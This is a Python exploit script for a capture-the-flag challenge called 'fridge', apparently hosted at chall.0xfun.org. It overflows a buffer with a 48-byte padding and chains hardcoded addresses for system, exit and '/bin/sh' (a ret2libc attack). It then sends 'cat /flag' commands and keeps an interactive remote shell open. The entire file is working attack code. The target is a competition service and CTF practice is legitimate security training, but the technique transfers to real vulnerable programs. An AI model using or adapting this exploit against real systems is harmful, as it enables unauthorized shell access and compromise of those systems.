#!/usr/bin/env python3
import argparse
import socket
import struct
import sys
import threading
import time
import select


HOST = "chall.0xfun.org"
PORT = 32834

OFFSET = 48
SYSTEM = 0x080490A0
EXIT = 0x080490B0
BIN_SH = 0x0804A09A


def p32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


def recv_until(sock, needles, timeout=3.0):
    sock.setblocking(False)
    data = b""
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.1)
        if sock in r:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            for needle in needles:
                if needle in data:
                    return data
    return data


def main():
    ap = argparse.ArgumentParser(description="0xfun fridge ret2libc")
    ap.add_argument("host", nargs="?", default=HOST)
    ap.add_argument("port", nargs="?", type=int, default=PORT)
    args = ap.parse_args()

    payload = b"A" * OFFSET + p32(SYSTEM) + p32(EXIT) + p32(BIN_SH)

    sock = socket.create_connection((args.host, args.port))

    banner = recv_until(sock, [b"Type:", b"> "], timeout=5.0)
    if banner:
        sys.stdout.buffer.write(banner)
        sys.stdout.flush()

    sock.sendall(b"2\n")
    prompt = recv_until(sock, [b"New welcome message", b":"], timeout=3.0)
    if prompt:
        sys.stdout.buffer.write(prompt)
        sys.stdout.flush()

    sock.sendall(payload + b"\n")
    sock.sendall(b"cat /flag 2>/dev/null; cat flag* 2>/dev/null; echo __DONE__\n")

    out = recv_until(sock, [b"__DONE__"], timeout=3.0)
    if out:
        sys.stdout.buffer.write(out)
        sys.stdout.flush()

    def rx():
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
        except Exception:
            pass

    t = threading.Thread(target=rx, daemon=True)
    t.start()

    try:
        for line in sys.stdin.buffer:
            sock.sendall(line)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
